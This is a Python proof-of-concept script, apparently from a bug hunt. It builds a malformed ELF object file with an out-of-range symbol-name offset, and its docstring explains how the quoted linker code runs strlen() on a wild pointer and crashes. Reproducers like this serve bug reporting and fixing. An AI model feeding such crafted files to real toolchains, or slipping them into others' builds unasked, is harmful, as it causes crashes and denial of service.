#!/usr/bin/env python3
"""Writes a minimal x86_64 ET_REL ELF object whose .symtab section holds the mandatory null
symbol (index 0) plus one real, otherwise perfectly ordinary global symbol whose st_name (a
32-bit byte offset into .strtab, per the ELF spec) is a huge, out-of-range value.

src/input-files.cc, ObjectFile<E>::parse_symbols() (called unconditionally, right after the
symtab/strtab sections are read, for every relocatable object file that has a .symtab at all):

    this->first_global = symtab_sec->sh_info;
    this->elf_syms = this->template get_data<ElfSym<E>>(ctx, *symtab_sec);
    this->symbol_strtab = this->get_string(ctx, symtab_sec->sh_link);
    this->populate_symbol_name_lengths();

InputFile<E>::populate_symbol_name_lengths():

    for (const ElfSym<E> &esym : elf_syms) {
      const char *p = symbol_strtab.data() + esym.st_name;   // st_name unchecked
      symname_lens.emplace_back(strlen(p));                   // strlen() on a wild pointer
    }

`get_string()` bounds-checks symbol_strtab's sh_offset/sh_size against the mapped file size, so
symbol_strtab itself is a legitimate, in-bounds view - but nothing anywhere validates that an
individual symbol's st_name actually falls inside that view before strlen() walks from it. This
object's .symtab has exactly 2 entries (null + 1 real symbol, entsize 24) and sh_info=1 (only the
null symbol is local - a valid, non-malicious sh_info so this doesn't also trip the sibling
first_global/register_global_symbols bug at input-files.cc:1118). The real symbol's st_name is set
to MALICIOUS_ST_NAME (~1GiB), placing `symbol_strtab.data() + st_name` far past the end of the
mmap'd input file - a single-page mmap tail (see the project's bug-hunt notes: a merely
one-past-the-end offset lands on a still-mapped, zero-filled page tail and reads silently as an
empty string, no crash) is not enough; a huge, multi-page-or-more offset is needed to reliably walk
off the entire mapped region and fault inside strlen().
"""
import struct
import sys

SHT_SYMTAB = 2
SHT_STRTAB = 3

MALICIOUS_ST_NAME = 0x40000000  # ~1 GiB - reliably walks off any mapped region


def shdr(name, type_, flags, addr, offset, size, link, info, addralign, entsize):
    return struct.pack("<IIQQQQIIQQ", name, type_, flags, addr, offset, size, link, info,
                        addralign, entsize)


def build() -> bytes:
    names = b"\x00"

    def addname(s):
        nonlocal names
        off = len(names)
        names += s.encode() + b"\x00"
        return off

    n_symtab = addname(".symtab")
    n_strtab = addname(".strtab")
    n_shstrtab = addname(".shstrtab")

    EHDR_SIZE = 64
    SHDR_SIZE = 64

    strtab_data = b"\x00evil\x00"  # a real, tiny, entirely legitimate strtab

    sym_null = struct.pack("<IBBHQQ", 0, 0, 0, 0, 0, 0)  # mandatory null symbol entry
    # A perfectly ordinary global symbol, EXCEPT st_name is huge/out-of-range.
    sym_evil = struct.pack("<IBBHQQ", MALICIOUS_ST_NAME, 0x10, 0, 1, 0, 0)  # STB_GLOBAL/STT_NOTYPE, shndx=1

    symtab_data = sym_null + sym_evil

    off = EHDR_SIZE
    off_symtab = off
    off += len(symtab_data)
    off_strtab = off
    off += len(strtab_data)
    off_shstrtab = off
    off += len(names)
    pad = (-off) % 8
    off += pad
    off_shdrs = off

    sh_null    = shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_symtab  = shdr(n_symtab, SHT_SYMTAB, 0, 0, off_symtab, len(symtab_data), 2,
                       1,  # sh_info = 1: only the null symbol (index 0) is local - valid
                       8, 24)
    sh_strtab  = shdr(n_strtab, SHT_STRTAB, 0, 0, off_strtab, len(strtab_data), 0, 0, 1, 0)
    sh_shstrtab = shdr(n_shstrtab, SHT_STRTAB, 0, 0, off_shstrtab, len(names), 0, 0, 1, 0)

    e_ident = bytes([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]) + b"\x00" * 8
    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,          # e_type = ET_REL
        62,         # e_machine = EM_X86_64
        1,          # e_version
        0,          # e_entry
        0,          # e_phoff
        off_shdrs,  # e_shoff
        0,          # e_flags
        EHDR_SIZE,
        0, 0,       # e_phentsize, e_phnum
        SHDR_SIZE,
        4,          # e_shnum
        3,          # e_shstrndx
    )
    assert len(ehdr) == EHDR_SIZE

    return (ehdr + symtab_data + strtab_data + names + b"\x00" * pad +
            sh_null + sh_symtab + sh_strtab + sh_shstrtab)


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    with open(out_path, "wb") as f:
        f.write(build())
    print(f"wrote {out_path}")


if __name__ == "__main__":
    main()
